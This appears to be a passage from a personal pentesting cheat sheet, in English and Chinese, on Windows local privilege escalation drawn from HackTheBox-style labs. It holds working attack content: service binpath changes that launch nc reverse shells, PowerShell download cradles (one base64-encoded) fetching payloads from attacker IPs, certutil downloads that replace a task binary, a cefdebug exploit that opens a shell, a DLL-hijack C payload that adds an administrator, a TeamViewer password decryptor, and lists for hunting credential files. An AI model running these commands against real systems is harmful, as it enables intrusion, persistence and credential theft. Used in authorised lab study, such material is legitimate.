for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v 
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users 
todos %username%" && echo.
)
```
**权限说明**

|permission|comments|
|:----|:----|
|D|Delete access|
|F|Full access (Edit_Permissions+Create+Delete+Read+Write)|
|N|No access|
|M|Modify access (Create+Delete+Read+Write)|
|RX|Read and eXecute access|
|R|Read-only access|
|W|Write-only access|


## Service

+ Unquoted Service paths
+ have insecure permissions(binary,registry)
+ passwords inside the command line of process
> 常见三方软件，配置错误
> 低权限用户对服务配置有修改权限，指向其他文件造成 提权
> 低权限用户可写服务目录（exe目录），替换文件提权

### Enum Service

```bat
# get service list
net start

# brief, 核心信息； full 全量
wmic service list brief

sc query [servicename]
Get-Service 

# powershell
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

# msf 
exploit/windows/local/service_permissions

```

### Permissions
+ recommended to have the binary accesschk from sysinternals to check the required privilege level for each service
+ check if "Authenticated Users" can modify any service
+ other permission can be used to privesc
  > SERVICE_CHANGE_CONFIG Can reconfigure the service binary
  > WRITE_DAC: Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG
  > WRITE_OWNER: Can become owner, reconfigure permissions
  > GENERIC_WRITE: Inherits SERVICE_CHANGE_CONFIG
  > GENERIC_ALL: Inherits SERVICE_CHANGE_CONFIG
+ accesschk.exe download for [xp-github](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe), [microsoft](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)

```bat
# get service info
sc query servicename

# icacls check folder/file
## F, full control
## M, modify access
## RX, read and execute
## W, write
icacls vulnservice.exe
icacls c:\program files\vuln service
C:\temp>icacls "c:\program files"
icacls "c:\program files"
c:\program files NT SERVICE\TrustedInstaller:(F)
                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(M)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 BUILTIN\Administrators:(M)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 BUILTIN\Users:(RX)
                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
                 CREATOR OWNER:(OI)(CI)(IO)(F)
                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)



# accesschk.exe,check service permission
# -u, suppress errors
# -w, show only objects have write permission
# -c, windows service, * to show all service
# -q, ommit banner ?
# -v, verbose
# -d, Only process directories or top level key
## permission to notice
## service_change_config

## accesschs, check file/folder permission
accesschk.exe /accepteula -uwdq "Folder"

## check user account's permission on service
accesschk.exe -ucqv <Service_Name>
accesschk.exe -accepteula -ucqv user <Service_Name>

## authenticated users can modify?
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
## check user's permission for all service 
accesschk.exe -uwcqv %USERNAME% * /accepteula
## check builtin user group service permission, 
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
## check user todos permission for all
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version

# accesschk, check service registry permission
accesschk.exe /accepteula -uwcqv user daclsvc


# check service registry 
## check registry entry of regsvc service, note to user and groups
## NT AUTHORITY\INTERACTIVE, all logon user; Builtin user
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

### Service config

**sc start error, for example SSDPSRV**
`System error 1058 has occurred.
The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.`
> upnphost depends on SSDPSRV to work(for xp sp1)
> group "Authenticated Users" has *SERVICE_ALL_ACCESS/service_change_config* in a service, could modify the binary
> 

```bat
# sc start error, enable service  

# method 1
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
# method 2, xp
sc.exe config usosvc start= auto

# modify service bin path, execute nc 
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"

# restart service
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]

# check startmode
wmic service where caption="Serviio" get name, caption, state, startmode
```

### binary weak Perm
+ check binary permisson or folder permission, if writable;
+ win service running with SYSTEM privilege, full permission to Everyone

```bat
# wmic
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"

wmci service list brief //部分server不可用

# 查找权限问题，icacls（vista及以上） 其他可用calc代替
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

# sc 
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt

sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt

FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt

FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt

cacls "C:\path\to\file.exe"
```

### reg weak perm
+ check permissions over a service registry
+ Check if Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl
+ RpcEptMapper绕过无法编辑ImagePath; AppendData/AddSubdirectory permission over service registry, [hacktricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/appenddata-addsubdirectory-permission-over-service-registry)

```bat
# Get the binary paths of the services
reg query hklm\System\CurrentControlSet\Services /s /v imagepath 

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"

# change the path
reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f

reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WeakService /v ImagePath /t REG_SZ /d "net user john Password123! /add" /F

# 检查Everyone对注册表中服务的配置有相关权限的项
# 这里检查出Everyone用户对WeakService有读写权
.\accesschk.exe "Everyone" -kvuqsw HKLM\SYSTEM\CurrentControlSet\services

accesschk.exe /accepteula "Authenticated Users" -kvuqsw HKLM\SYSTEM\CurrentControlSet\services

# powersploit
# https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
Get-ModifiablePath
```

### Unquoted Service path

+ 当前用户对目标目录可写
+ 需重启服务，可能需重启系统
+ windows调用CreateProcess API时因空格引起的加载特性
+ practise pg ut99. delay the reboot by a few seconds and also chain the exit command (e.g. shutdown -r -t 10 && exit). This will schedule the reboot and terminate our shell properly after a second or two without crashing the service. The reboot will then succeed without issues, and we will get our privileged shell back.

For example, for the path `C:\Program Files\My Program\My Service\service.exe`

```bat
# 加载顺序如下
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe

# list all unquoted service path, minus built-in windows service
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

# Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)

# 搜索不带引号且其中有空格的服务
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" |findstr /i /v """

# msf 
exploit/windows/local/trusted_service_path

# 重启服务
sc stop WeskService,sc start WeakService

# 重启系统
shutdown /r /t 0
# schedule shutdown and exit shell, avoid the crash and stall reboot
shutdown /r /t 10 && exit

# powerup 查看
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.128/Powershell/PowerSploit/Privesc/PowerUp.ps1');Get-UnquotedService"

# powerup write service 
Write-ServiceBinary
# 默认执行的命令为添加用户并添加至local
net user john Password123! /add && timeout /t 5 && net localgroup Administrators john /add

# -name, sevice name
Write-ServiceBinary -Name WeakService -UserName john -Password Password123! #这样传入的参数
```

### Recovery Actions
Learn later; from hacktricks.
+ It's possible to indicate Windows what it should do [when executing a service this fails](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN). + If that setting is pointing a binary and this binary can be overwritten you may be able to escalate privileges.

### exploit

```bat
# generate payload 
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe

# MSF进程迁移，配合使用避免建立session 后 die
post/windows/manage/migrate

#查询服务信息
sc qc WeakService

move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"
move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"

# stop service
net stop Serviio

# 查看是否可重启， 无SeShutdownPrivilege表示无法重启
# disable 表示当前running process 无权限，即 whoami 无权限
whoami /priv

shutdown /r /t 0
```

### Service-Powerup

```powershell
# 根据给定的权限集测试一个或多个传递的服务或服务名称，返回当前用户具有指定权限的服务对象。
Test-ServiceDaclPermission

#从服务中过滤权限
Get-Service | Test-ServiceDaclPermission -PermissionSet 'AllAccess'
Get-Service | Test-ServiceDaclPermission -PermissionSet 'Restart'
Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig'
Get-Service | Test-ServiceDaclPermission -Permissions 'Start' |select -First 5Get-Service | Test-ServiceDaclPermission -Permissions 'Stop'
Get-Service | Test-ServiceDaclPermission -Permissions "ChangeConfig"

//method 1
#枚举所有服务，并返回脆弱的服务文件
Get-ModifiableServiceFile

#枚举当前用户可以修改 binPath 的所有服务并返回服务
Get-ModifiableService

#将服务二进制替换为添加本地管理或执行自定义命令的二进制
Install-ServiceBinary -Name 'WeakService'

#用原始可执行文件还原被替换的服务二进制文件
Restore-ServiceBinary -Name 'WeakService'

//method 2
Get-ModifiableService #枚举当前用户可以修改 binPath 的所有服务并返回服务。
Set-ServiceBinaryPath -Name WeakService -Path 'net user john Password123! /add ' #设置服务启动启动二进制文件，对应在注册表中ImagePath的值
Restart-Service WeakService #重启服务

//method 3, Invoke-ServiceAbuse
Get-ModifiableService #枚举当前用户可以修改 binPath 的所有服务并返回服务。
Invoke-ServiceAbuse -Name 'WeakService' #修改易受攻击的服务，以创建本地管理员或执行自定义命令，实际上它调用了Set-ServiceBinaryPath设置为执行的
```

## Application

### Installed app&patch
+ all installed application, noting ther version of each(as well as th OS patch level level on windows-based systems)
+ using the info to search for a matching exploit
+ product, vendor, version,  installed application could be useful to look for pe attacks
+ hotfixid, installedon; when did the last update, make it easier to exploit.
+ check permissions of the binary, if modifiable
+ remoteNG, appodata\roaming\mRemoteNG\confCons.xml contains the password; htb bastion
+ teamviewer 7, password crack.

> wmic，provides access to the ***Windows Management Instrumentation***, which is the infrastructure for management data and operations on windows.
> [wmic cmd doc](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic)

```bat
# only list application used windows installer
# installed product name, version, vendor
wmic product get name, version, vendor

# qfe, Win32_QuickFixEngineering
wmic qfe get Caption, Description, HotFixID, InstalledOn

# servcie，auto
# /i, 忽略大小写
# /v, 反向查找，不包含
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

# installed app
## common dir
## c:\program files
## C:\Program Files (x86)
## c:\users\<username>\Appdata\, roamin\xxx may contain the password in config file.
## %LocalAppData%\Packages\, Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe  pg-robust
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
dir /a %LocalAppData%\Packages\
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

### Write perm
+ check if you can modify some config file to read some special file
+ check if you can modify some binary that is going to execute by admin(sched tasks)

```bat
# find weak folders/files permissions
accesschk.exe /accepteula 
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*


icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Scheduled task
+ system scheduled task misconfitured
+ user-created file which insecure permissions; 非常规目录的ps1文件
+ next runtime, last runtime, task to run, schedule type, start time, start date
+ schtasks 无法查看管理员的任务
+ more about [startup on hacktricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries)

```bat
# check file perm
accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

# /S system, 远程连接的系统
# /query, display tasks
# /fo, format; table/list/csv
# /v, verbose output
# /NH, table/csv 指定不显示列标题
# /V, 显示详细任务输出
# /TN taskname, 检索的task path\name
schtasks /query /fo LIST /v
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"

schtasks /query /fo LIST 2>nul | findstr TaskName

# copy to linux and search
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM

# Powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
# powershell and filter
## -context 10, 上下文
schtasks /query /fo LIST /v | select-string 'TFTP' -context 10

#筛选 删除包含/Microsoft/Windows/路径的所有任务
Get-ScheduledTask | Select * | ? {($_.TaskPath -notlike "\Microsoft\Windows\*") -And ($_.Principal.UserId -notlike "*$env:UserName*")} | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @{Name="User";Expression={$_.Principal.userID}}

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"

at # early windows, xp

#分析计划任务  查找行为，比如exe，脚本什么的
$task= Get-ScheduledTask -TaskName 计划任务名 
ForEach ($triger in $task.Triggers) { echo $triger.Repetition.Interval}

# 查找计划任务行为所在目录，低权限用户是否具有可写权限  accesschk.exe  当然也可以用icacls命令
# “M”表示修改，“F”代表完全控制，“CI”代表从属容器将继承访问控制项，“OI”代表从属文件将继承访问控制项。
accesschk64.exe -accepteula -wv lowuser C:\ScheduledTasks\Task1\1111.exe

#直接替换
certutil -urlcache -split -f "http://你的vps/1111.exe" C:\ScheduledTasks\Task1\1111.exe
#等待计划任务执行
```

### AutoRun
Auto run to privesc, [hacktricks autorun](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries)
> schetask 属于autorun 的内容， 作为官方介绍的方式单独列出；

+ autologon, check reg to get password
+ autorun, check if have write permission to the folder or binary in reg(Run/RunOcne/RunonceEx/ServiceRun..)
+ start up path, check permission of the folder under HKLM
+ ...

```powershell
# wmic check startup program and command
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl

# startup folder 
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"

# auto logon cmd search
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername" #command prompt

# auto run check, powerup; lots of registry
Get-ModifiableRegistryAutoRun


# auto logon example, add reg; admin privilege
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomain /t REG_SZ /d "PC-jack-0day" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "jack" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "admin" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d  1 /f

# autorun expample
mkdir "c:\calc" 
copy %windir%\system32\calc.exe c:\calc
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v calc /t REG_SZ /d "C:\calc\calc.exe" /f #需使用管理员权限

```

### Drivers
+ check for possible **third party wierd/vulnerable** drivers

```bat
# /si, 提供有关已签名驱动的信息
driverquery
driverquery /fo  table
driverquery /SI
```

### cve soft
+ windows software with cves
+ teamviewer, password crack
+ visual studio, cefdebug exploit

#### Teamviewer
+ teamviewer password crack
+ htb remote

```powershell
# look at that registry key
cd HKLM:\software\wow6432node\teamviewer\version7

# dumps a list of integers
(get-itemproperty -path .).SecurityPasswordAES
```

decrypt python

```python
#!/usr/bin/env python3
# key and iv, from msf post/windows/gather/credentials/teamviewer_passwords

from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 
                    19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 
                    126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")

print(f"[+] Found password: {password}")
```

#### visual studio 10
+ visual studio 10 cefdebug, [exploit](https://github.com/taviso/cefdebug)

```bash
## port local,  port periodly open.
netstat -an | findstr 127

## scan local machine
.\cef.exe

## get shell, use nc
.\cef.exe --code "process.mainModule.require('child_process').exec('C:\\windows\\system32\\spool\\drivers\\color\\n.exe 10.10.14.42 9001 -e cmd')" --url ws://127.0.0.1:49900/4385feda-aac1-4c7e-8215-ad3c0a838358

## nishang shell; Delete the help msg and change function name to bypass av
## iconv utf-16LE and base64, deal with the quote things.
echo "IEX(new-object net.webclient).downloadstring('http://10.10.14.42/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0

## always test your shell code, especially encoded powershell.
## check the encoded shell 
powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQAMgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQAKAA==

## get shell via nishang encoded 
.\cef.exe --code "process.mainModule.require('child_process').exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQAMgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQAKAA==')" --url  ws://127.0.0.1:17521/143e873e-4592-4a72-8765-27d20b778fc0
```

## Path DLL hijack - to learn
learn later；
+ check permission of folders inside path, could be able to hijack a DLL loaded by a process and privesc
+ backup operators member, dll hijack. htb-blackfield.
  
```bat
# check permissions of all folders inside path
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

### backup operators
+ backup operators member, dll hijack. htb-blackfield.

```bash
# backup operators member exploit. dll hijack
## https://github.com/itm4n/UsoDllLoader
## https://snowscan.io/htb-writeup-blackfield/#

x86_64-w64-mingw32-gcc -o windowscorediviceinfo.dll adduser.c -shared

upload /home/kali/lab/htb/blackfield/hijack/ WindowsCoreDeviceInfo.dll c:\temp\WindowsCoreDeviceInfo.dll
upload /home/kali/lab/htb/blackfield/hijack/UsoDllLoader.exe c:\temp\usodllloader.exe
mkdir system32
move windowscorediviceinfo.dll .\system32
move UsoDllLoader.exe .\system32
robocopy /b system32 c:\windows\system32

## exploit
.\usodllloader.exe

## check user, should be local administrator
net user hack01
```

exploit payload
```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>


int pwn()
{
        WinExec("C:\\Windows\\System32\\net.exe users hack01 Hack1234! /add", 0);
        WinExec("C:\\Windows\\System32\\net.exe localgroup administrators hack01 /add", 0);
        return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD  ul_reason_for_call,
        LPVOID lpReserved
)
{
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
                pwn();
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
                break;
        }
        return TRUE;
}
```


## Network info
+ network interface, routes, open ports
+ if target connected to multiple networks, could be used as a povit
+ investigate port binding on a loopback address
+ privileged program or service listening on the loopback interface
+ listening ports and connection to other users
+ specific virtual interfaces may indicate the existence of virtualization or antivirus software

### net basic

```bat
ipconfig /all

route print //network routing tables
route print -4
arp -A # arp缓存表

# -a, active tcp conn
# -n, display address and port in num
# -o, owner pid
netstat -ano

# Port forward using plink
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080

# Port forward using meterpreter
portfwd add -l <attacker port> -p <victim port> -r <victim ip>
portfwd add -l 3306 -p 3306 -r 192.168.1.101
```

### firewall
+ firewall state, profile, rules
+ remotely access to network service filterd by firewall, access locally via loopback interface
+ inbound and outbound port filtering, which is useful for port for port forwarding and tunneling(pivot to internal network); may expand our attack surface

```bat
netsh firewall show state # show state, 已弃用
netsh firewall show config
netsh advfirewall show currentprofile # firewall stratage

# list all firewall rules
netsh advfirewall firewall show rule name=all

# firewall log file
c:\windows\system32\logfiles\firewall\pfirewall.log

netsh firewall show state # FW info, open ports
netsh advfirewall firewall show rule name=all
netsh firewall show config # FW info
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off  #Turn Off
NetSh Advfirewall set allprofiles state on  #Trun On
netsh firewall set opmode disable #Turn Off

# How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop" 

# more firewall command
https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters#firewall

```

### hosts file
+ check for other known computers hardcoded on the hosts file

```bat
type C:\Windows\System32\drivers\etc\hosts
```

### Shares

```bat
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### interface & dns

```bat
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

## Subsys linux
+ sub linux file, check ssh key/history files; `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs`
+ bash.exe, `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`
+ check if have root

```bat
wsl whoami

# start as root
wsl --default-user root

./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

## Unmounted disk
+ unmounted drives could contains valuable information
+ check the mount permissions
+ check for sensitive file/info, creds and other info

```bat
mountvol
```

## file and reg(creds)
+ search hiden file, search file in root dir
+ password in files, txt/xml/inf/config 
+ password in reg, winlogon/putty sessions
+ password in saved cred, then runas
+ password in sam backup file
+ password in some special files, dll/exe; extract with strings(-e l or others) htb multimaster/sizzle

### pwd in files

```bat
# /s, 当前目录和子目录
# /i, 忽略大小写
# /p, 忽略不可打印字符
# /n, 在匹配的每行前打印行数
# /m, 打印匹配到的文件名
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*

# search password in txt file, current dir; will print the matched content
findstr /c:"password" /si *.txt

# search for a file with certain filename
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini

# rdp保存的密码，mimikatz提取guidmasterkey、获取masterkey后解密cred
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
```

**unattended file, base64**

```bat
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul

# msf
post/windows/gather/enum_unattend
```

**possible filename contains credentials**
contained passwords in clear-text or Base64
```bat
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"

Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}

# files
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
